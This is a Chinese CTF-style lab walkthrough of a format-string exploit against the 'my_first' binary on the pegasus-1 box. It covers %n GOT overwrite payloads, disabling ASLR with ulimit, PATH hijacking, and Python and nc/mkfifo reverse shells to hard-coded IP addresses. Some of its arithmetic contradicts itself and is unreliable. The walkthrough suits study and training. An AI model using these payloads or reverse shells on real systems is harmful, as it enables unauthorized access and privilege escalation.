@@ -1,0 +1,533 @@
+## 简介
+
+ **渗透测试-地基篇**
+
+该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。
+
+ **请注意** ：
+
+> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
+> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。
+
+## 一、前言
+
+缓冲区溢出（buffer
+overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。
+
+项目四十四：pegasus-1，考验了缓冲区溢出知识，该项目存在非常多的知识点，存在my_first文件，该项目是Linux环境运行着二进制文件，该文件是一个计算器程序，该环境就和AWD中的PWN题目一样，直播教学会有多种方法详细解释如何理解缓冲区溢出，如何发现缓冲区溢出，遇到缓冲区溢出如何利用，栈是什么等等问题详解。
+
+接下来我讲分享其中方法一给到各位小伙伴学习，欢迎大佬
+
+## 二、项目介绍
+
+该项目存在非常多的知识点和防护手段，需要很强的基础知识和渗透手段才可以攻破拿到该服务器权限，一路旅程从：
+
+    
+    
+    外网信息收集->目录爆破->文件模糊枚举wfuzz->C语言shell->格式字符串缓冲区溢出反弹shell->NFS提权
+    
+
+才到咱们本章最有意思的格式字符串缓冲区溢出点，当然前面的逻辑贯穿能力也不可缺失，接下来将详细介绍格式字符串缓冲区如何溢出提权的，在栈空间中遨游！  
+![1650083076_625a45049f0a38a0f250a.png!small?1650083077705](https://image.3001.net/images/20220416/1650083076_625a45049f0a38a0f250a.png!small?1650083077705)
+
+通过审计代码页面写入C语言的shell代码并反弹，获得反弹mike用户的反弹shell，进入了缓冲区的世界内，今天仅仅讲解缓冲区溢出，让各位学到更多，接下来是通过提权拿到了该普通用户权限：  
+![1650083083_625a450b730adaab8232c.png!small?1650083085589](https://image.3001.net/images/20220416/1650083083_625a450b730adaab8232c.png!small?1650083085589)![1650083088_625a451064833321b440e.png!small?1650083089068](https://image.3001.net/images/20220416/1650083088_625a451064833321b440e.png!small?1650083089068)  
+my_first程序，疑似存在缓冲区溢出！
+
+## 三、下载程序
+
+将该文件base64转发下载到本地进行逆向分析：  
+1）base64转码。  
+![1650083092_625a45147ed88805ccdf3.png!small?1650083102334](https://image.3001.net/images/20220416/1650083092_625a45147ed88805ccdf3.png!small?1650083102334)
+
+    
+    
+    cd /home/mike
+    base64 my_first
+    
+
+2）将转码值写入本地文本并解码成文件。  
+![1650083096_625a451841f3f5b34aa6d.png!small?1650083102335](https://image.3001.net/images/20220416/1650083096_625a451841f3f5b34aa6d.png!small?1650083102335)
+
+    
+    
+    vi base64.txt   ---放入base64编译值
+    cat base64.txt | base64 -d > my_first
+    md5sum my_first   ---双方MD5值对比（因MD5不可逆）
+    
+
+## 四、缓冲区溢出测试
+
+### 1、测试是否存在缓冲区溢出
+
+使用python测试是否存在缓冲区溢出，当然perl也是可以的。  
+![1650083100_625a451c29c241f7b0acc.png!small?1650083102335](https://image.3001.net/images/20220416/1650083100_625a451c29c241f7b0acc.png!small?1650083102335)
+
+    
+    
+    ./my_first $(python -c 'print "A"*100')
+    
+
+发现需要输入数组操作！缓冲区溢出分为栈溢出、堆溢出、格式字符串溢出，目前仅仅测试了最基础的溢出手法，来看看该程序的函数主体，将用到IDA！
+
+IDA Pro（Interactive Disassembler Professional）简称“IDA”，是Hex-Rays公司出品的一款交互式反汇编工具，是目前最棒的一个静态反编译软件，为众多0day世界的成员和ShellCode安全分析人士不可缺少的利器。IDA
+Pro具有强大的功能，但操作较为复杂，需要储备很多知识，同时，它具有交互式、可编程、可扩展、多处理器等特点，可以通过Windows或Linux、MacOS平台来分析程序，
+被公认为最好的逆向工程利器之一。  
+![1650083105_625a45214edaf6c816d03.png!small?1650083108355](https://image.3001.net/images/20220416/1650083105_625a45214edaf6c816d03.png!small?1650083108355)
+
+> 当然使用GDB也是可以逆向分析的！
+
+通过IDA查看到，使用了calculator()函数进行计算，计算中使用了printf函数，测试是否存在格式字符串缓冲区溢出！  
+%x是printf支持的格式字符串！用来显示关联十六进制输入数值！  
+从堆栈中获取一个值：  
+![1650083109_625a4525d1d5b0159e9e5.png!small?1650083110840](https://image.3001.net/images/20220416/1650083109_625a4525d1d5b0159e9e5.png!small?1650083110840)
+
+    
+    
+    Enter second number: %x
+    Error details: ffcdfe6c
+    
+
+在第三位输入地存在%x格式字符串缓冲区溢出！
+
+ **函数原型**
+
+    
+    
+    int printf ("格式化字符串",参量... )
+    
+
+函数的返回值是正确输出的字符的个数，如果输出失败，返回负值。
+
+参量表中参数的个数是不定的（如何实现参数的个数不定，可以参考《程序员的自我修养》这本书），可以是一个，可以是两个，三个...，也可以没有参数。  
+printf函数的格式化字符串常见的有`%d，%f，%c，%s，%x`（输出16进制数，前面没有0x），%p（输出16进制数，前面带有0x）等等。  
+但是有个不常见的格式化字符串%n，它的功能是将%n之前打印出来的字符个数，赋值给一个变量。
+
+除了%n，还有%hn，%hhn，%lln，分别为写入目标空间2字节，1字节，8字节。注意是对应参数（这个参数是指针）的对应的地址开始起几个字节。不要觉得%lln，取的是8个字节的指针，%n取的就是4个字节的指针，取的是多少字节的指针只跟程序的位数有关，如果是32位的程序，%n取的就是4字节指针，64位取的就是8字节指针，这是因为不同位数的程序，每个参数对应的字节数是不同的。
+
+### 2、printf测试字符串缓冲区溢出
+
+printf命令模仿了C语言中的printf()函数。主要作用是输出文本，按照我们指定的格式输出文本。还有一个输出文本的命令echo，在输出文本时，echo会换行。printf命令不会对输出文本进行换行，可以使用\n进行换行，但是printf命令的优势是格式化文本。  
+![1650083116_625a452c1f6b1e7dcf6a6.png!small?1650083116359](https://image.3001.net/images/20220416/1650083116_625a452c1f6b1e7dcf6a6.png!small?1650083116359)
+
+    
+    
+    Select your tool:
+    [1] Calculator         ---计算器
+    [2] String replay      ---字符串回放
+    [3] String reverse     ---字符串反转
+    [4] Exit
+    
+
+接下来将使用printf命令和换行符进行测试越过1~4选项：
+
+![1650083119_625a452fe4adaa4dfaafa.png!small?1650083120661](https://image.3001.net/images/20220416/1650083119_625a452fe4adaa4dfaafa.png!small?1650083120661)
+
+    
+    
+    printf '1\n1\n1\n4\n' | ./my_first
+    
+
+运行1用于计算器，\n用于换行（也称为输入），然后第二个1用于第一个数字，第三个1用于第二个数字，最后输入4为退出！  
+还原也就是这样：
+
+    
+    
+    └─# ./my_first     
+    WELCOME TO MY FIRST TEST PROGRAM
+    --------------------------------    Select your tool:
+    [1] Calculator
+    [2] String replay
+    [3] String reverse
+    [4] Exit
+    
+    Selection: 1
+    
+    Enter first number: 1
+    Enter second number: 1
+    Result: 1 + 1 = 2
+    
+    Selection: 4
+    
+    Goodbye!
+    
+
+找到printf方式后，这时候就可以在其中添加%x进行下一步测试了！
+
+### 3、测试溢出点-%%x
+
+使用刚测试出的printf命令进行插入%%x来测试缓冲区溢出：
+
+    
+    
+    printf '1\n1\n%%x\n4\n' | ./my_first
+    
+
+![1650083126_625a453641353c0f7f3bc.png!small?1650083127063](https://image.3001.net/images/20220416/1650083126_625a453641353c0f7f3bc.png!small?1650083127063)
+
+    
+    
+    Enter first number: Enter second number: Error details: ffb160dc
+    
+
+可看到它需要2个%来逃避！找到了%%来测试缓冲区溢出的手法后，需要开始查看空间地址植入A、B、C！
+
+## 五、格式字符串缓冲区溢出攻击
+
+### 1、找到溢出空间显示
+
+由于格式字符串中使用直接参数访问，可以直接引用参数8！  
+![1650083142_625a45466188327a014f8.png!small?1650083142916](https://image.3001.net/images/20220416/1650083142_625a45466188327a014f8.png!small?1650083142916)参考：wiki
+google``
+
+由于占空间8位数利用：8$进行显示！接下来在\n后插入AAAA和8即可：
+
+    
+    
+    printf '1\n1\nAAAA.%%8$x%%x\n4\n' | ./my_first
+    
+
+![1650083148_625a454c32f62018ddf36.png!small?1650083149150](https://image.3001.net/images/20220416/1650083148_625a454c32f62018ddf36.png!small?1650083149150)
+
+    
+    
+    Enter first number: Enter second number: Error details: AAAA.41414141ffff06ec
+    
+
+可以看到格式字符串中的参数8，是堆栈部分的开始！
+
+### 2、寻找system位置
+
+我需要查看地址system()（shell负载在哪里）和printf（漏洞在哪里）的位置，通过运行gdb->设置断点->运行程序->打印输出来做到这一点：
+
+    
+    
+    gdb my_first
+    b main    ---main主函数下断点
+    run
+    print system
+    
+
+![1650083156_625a45541820b9bd24bb0.png!small?1650083159137](https://image.3001.net/images/20220416/1650083156_625a45541820b9bd24bb0.png!small?1650083159137)
+
+    
+    
+    $1 = {<text variable, no debug info>} 0x40069060 <system>
+    
+
+系统位于 0x40069060
+
+### 3、寻找printf位置
+
+要找到printf，我们可以运行objdump：
+
+    
+    
+    objdump -R ./my_first
+    
+
+![1650083161_625a4559529f377fb1699.png!small?1650083162646](https://image.3001.net/images/20220416/1650083161_625a4559529f377fb1699.png!small?1650083162646)
+
+    
+    
+    08049bfc R_386_JUMP_SLOT   printf@GLIBC_2.0
+    
+    1. system() = 0x40069060
+    2. printf = 0x08049bfc
+    
+
+可看到已经找到system和printf的栈空间位置！接下来弄清楚如何在内存中写入shellcode即可！
+
+### 4、查看安全机制-ALSR
+
+地址空间随机化(Address Space Layout
+Randomization)（ASLR）是一种操作系统用来抵御缓冲区溢出攻击的内存保护机制。这种技术使得系统上运行的进程的内存地址无法被预测，使得与这些进程有关的漏洞变得更加难以利用。
+
+查看ASLR设置：  
+![1650083167_625a455f3c10050454a83.png!small?1650083167580](https://image.3001.net/images/20220416/1650083167_625a455f3c10050454a83.png!small?1650083167580)
+
+    
+    
+    cat /proc/sys/kernel/randomize_va_space
+    2
+    
+
+0 = 关闭  
+1 = 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）  
+2 = 全随机。除了1中所述，还有heap。  
+说明存在随机化！
+
+### 5、禁用ALSR
+
+需要禁用ASLR，地址空间布局随机化 (ASLR) 是一种用于操作系统 (OS)
+的内存保护过程，它通过随机化系统可执行文件加载到内存中的位置来防止缓冲区溢出攻击。 要禁用，我遵循此文档：
+
+    
+    
+    https://www.exploit-db.com/exploits/39669/
+    
+
+![1650083172_625a45640b274eac171d6.png!small?1650083174371](https://image.3001.net/images/20220416/1650083172_625a45640b274eac171d6.png!small?1650083174371)
+
+通过文章知道，为了解决这个问题，可以使用ulimit来增加堆栈大小，ulimit -s
+unlimited将最大化堆栈大小，有效地导致ASLR实际上不存在，也就是禁用了！
+
+    
+    
+    ulimit -s
+    8192
+    ulimit -s unlimited
+    
+
+![1650083176_625a4568b8c6fddfbb064.png!small?1650083177648](https://image.3001.net/images/20220416/1650083176_625a4568b8c6fddfbb064.png!small?1650083177648)  
+可以看到开始是8192，使用后不存在了！
+
+### 6、测试printf填充格式字符串
+
+"%n"将一个整数写入进程内存中的位置，需要将shellcode合并到有效负载中，到目前为止，目前只有一堆A和它在哪里打印的位置地址！
+
+并且在开始构建我们的漏洞利用时，我们的目标是使用%n写入新地址，我们将指向system()，而不是指向当前存在的printf，因为它允许我们调用shell恶意代码！接下来测试下将代码写入一个文件程序内，将A替换为printf的位置：
+
+    
+    
+    printf '1\n1\nAAAA.%%8$x%%x\n4\n' | ./my_first
+    替换为：printf = 0x08049bfc
+    printf '1\n1\n\xfc\x9b\x04\x08%%8$n' > shell
+    
+
+![1650083181_625a456dea1d449477e13.png!small?1650083185137](https://image.3001.net/images/20220416/1650083181_625a456dea1d449477e13.png!small?1650083185137)
+
+    
+    
+    gdb ./my_first
+    r < shell
+    x/x 0x08049bfc
+    
+
+现在说printf位于地址：0x00000004
+
+可以看到准备格式字符串所需的填充时，主要为了调试应用程序！  
+接下来在执行my_first调用printf()函数用管道的方法重定向调用文件shell，剩下的就是填充格式字符串！下一个目标是将地址0x00000004变成0xb760a060，即system()的地址！
+
+### 7、计算栈空间位置前半段位置
+
+《红队项目PinkysPalace格式字符串缓冲区溢出》里面格式字符串最后有算数空间地址的地方！当时是计算器计算，现在教利用python进行计算！
+
+    
+    
+    1. system() = 0x40069060
+    2. printf = 0x08049bfc
+    
+
+只需要将system的空间地址分两块进行：
+
+    
+    
+    4006
+    9060
+    
+
+由于是小端，从9060开始计算！
+
+ **计算9060：**  
+我们知道十进制表示法中的位置0004是4，然后我们可以将9060转换为十进制后在减去4：  
+![1650083187_625a4573ac1e04cff9a42.png!small?1650083187950](https://image.3001.net/images/20220416/1650083187_625a4573ac1e04cff9a42.png!small?1650083187950)
+
+    
+    
+    shell echo $(python -c 'print 0x9060-0x4')
+    
+
+得到：36956
+
+可以将36956u（%u是无符号十进制数）和%%8$n（将写入第8位）添加到我们的shell有效负载中，测试看看这是否有效：
+
+    
+    
+    printf '1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n' > shell
+    gdb ./my_first
+    r < shell
+    
+
+![1650083192_625a45783aa31cecadd75.png!small?1650083192563](https://image.3001.net/images/20220416/1650083192_625a45783aa31cecadd75.png!small?1650083192563)
+
+    
+    
+    Program received signal SIGSEGV, Segmentation fault.
+    0x00009060 in ?? ()
+    
+
+可看到回显对应了前半段的值，成功编写了前半段的system()位置！
+
+### 8、计算栈空间位置后半段位置
+
+《红队项目PinkysPalace格式字符串缓冲区溢出》也讲解过了，后半段空间需要实际移动内存中的2个位置来写入这个值也就是：
+
+    
+    
+    0x08049bfc
+    0x08049bfe(+2)
+    
+
+所以shellcode变为：
+
+    
+    
+    printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36956u%%8$n%%9$n' > shell
+    gdb ./my_first
+    r < shell
+    
+
+![1650083197_625a457d30c196602d3b9.png!small?1650083197410](https://image.3001.net/images/20220416/1650083197_625a457d30c196602d3b9.png!small?1650083197410)
+
+    
+    
+    Program received signal SIGSEGV, Segmentation fault.
+    0x90649064 in ?? 
+    
+    原system=0x40069060
+    变化后：0x90649064
+    
+
+下半部分已经从9060变为9064，这没问题只需要从原始小数中减去4即可，还注意到上半部分是9064，用4006是正确的上半部分进行相同的计算，然后从9064中减去它，这里需要在最低有效位上加一个1，这会进入相同的内存地址，0x14006在去进行减法：
+
+    
+    
+    int ("9064", 16)    ---计算出36964
+    int("14006", 16)    ---计算出81926
+    81926 - 36946
+    44962
+    
+
+![1650083201_625a45817681ed14848ff.png!small?1650083202510](https://image.3001.net/images/20220416/1650083201_625a45817681ed14848ff.png!small?1650083202510)
+
+shellcode编写，继续测试：
+
+    
+    
+    printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44962u%%9$n' > shell
+    gdb ./my_first
+    r < shell
+    
+
+![1650083205_625a45851f64647e06069.png!small?1650083205380](https://image.3001.net/images/20220416/1650083205_625a45851f64647e06069.png!small?1650083205380)
+
+    
+    
+    0x40029060 in ?? ()
+    
+
+可看到还是不对！  
+![1650083208_625a4588dd0068fb2ea1d.png!small?1650083209288](https://image.3001.net/images/20220416/1650083208_625a4588dd0068fb2ea1d.png!small?1650083209288)
+
+    
+    
+    int ("4002", 16)    ---计算出16386
+    int ("4006", 16)    ---计算出16390
+    16386 - 16390
+    -4
+    
+
+实际上可以减去十六进制4002和十六进制4006，这是十进制的-4之差！
+
+### 9、shellcode
+
+最终shellcode空间位置：
+
+    
+    
+    44962+4=44966
+    
+    printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > shell
+    gdb ./my_first
+    r < shell
+    
+
+![1650083213_625a458dc96c03f928fc1.png!small?1650083214205](https://image.3001.net/images/20220416/1650083213_625a458dc96c03f928fc1.png!small?1650083214205)
+
+    
+    
+    0x08c3b561 in ?? ()   回显：h: 1: Selection:: not found
+    
+
+输出是正确的，确认可以用system（）覆盖printf（）了！  
+根据回显知道，它会在系统“Selection:”处调用命令程序！测试下将python的shellcode写入到“Selection:”的文件中！  
+![1650083217_625a4591de180323b0107.png!small?1650083218199](https://image.3001.net/images/20220416/1650083217_625a4591de180323b0107.png!small?1650083218199)
+
+    
+    
+    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+    
+
+准备好shell反弹即可！
+
+### 10、格式字符串缓冲区提权
+
+由于回显内容，可以判断函数内容：system(“Selection:”)！  
+![1650083234_625a45a2a62d4f0e3d0b7.png!small?1650083235199](https://image.3001.net/images/20220416/1650083234_625a45a2a62d4f0e3d0b7.png!small?1650083235199)  
+打算利用溢出创建一个权限dayu的文件！  
+![1650083239_625a45a7e1baea48a1008.png!small?1650083240623](https://image.3001.net/images/20220416/1650083239_625a45a7e1baea48a1008.png!small?1650083240623)
+
+    
+    
+    printf '1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n' > shell
+    
+    gcc dayu1.c -o "Selection:"
+    export PATH=/home/mike/:$PATH
+    
+
+接下来直接执行文件让my_first程序直接调用程序执行Selection生成一个john权限的文件：
+
+    
+    
+    cat shell | ./my_first
+    
+
+![1650083244_625a45acb5bee481b69eb.png!small?1650083245281](https://image.3001.net/images/20220416/1650083244_625a45acb5bee481b69eb.png!small?1650083245281)  
+成功创建dayu1可执行程序权限为john：  
+![1650083249_625a45b160a31fddf628b.png!small?1650083250177](https://image.3001.net/images/20220416/1650083249_625a45b160a31fddf628b.png!small?1650083250177)  
+成功溢出提权！当然这里还可以反弹shell！写入一句话到可执行文件然后进行拿权限！
+
+### 11、格式字符串缓冲区反弹shell
+
+根据提权已经知道函数内容：system(“Selection:”)！
+
+    
+    
+    echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.138 4444 >/tmp/f' > "Selection:"
+    
+
+写入一句话反弹shell！  
+![1650083254_625a45b651dbc6b7b1848.png!small?1650083255247](https://image.3001.net/images/20220416/1650083254_625a45b651dbc6b7b1848.png!small?1650083255247)
+
+    
+    
+    cat shell | ./my_first
+    
+
+成功获得反弹john-shell！
+
+## 六、经验总结
+
+今天学到ELF格式字符串缓冲区溢出中下载程序到真正开始缓冲区溢出测试，其中包含了测试是否存在缓冲区溢出、printf测试字符串缓冲区溢出、测试溢出点-%%x、找到溢出空间显示、寻找system位置、寻找printf位置、查看安全机制-ALSR、禁用ALSR、测试printf填充格式字符串、计算栈空间位置前半段位置、计算栈空间位置后半段位置、shellcode、格式字符串缓冲区提权、格式字符串缓冲区反弹shell等等操作，最后远程代码执行控制服务器等操作，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！来巩固告知企业单位的漏洞情况，并尽快进行加固巩固安全！
+
+ **提醒：**
+
+    
+    
+    1. 记得要禁用ALSR
+    2. 空间计算可以用十进制和十六进制计算
+    3. payload python反弹shell应该是一次性的
+    4. 计算空间准确值必须仔细，错一位数都无法溢出！
+    
+
+希望大家提高安全意识，没有网络安全就没有国家安全！
+
+今天基础牢固就到这里，虽然基础，但是必须牢记于心。
+
+作者：大余
+
+ **参考：**
+
+> https://blog.csdn.net/qq_43394612/article/details/84900668
+
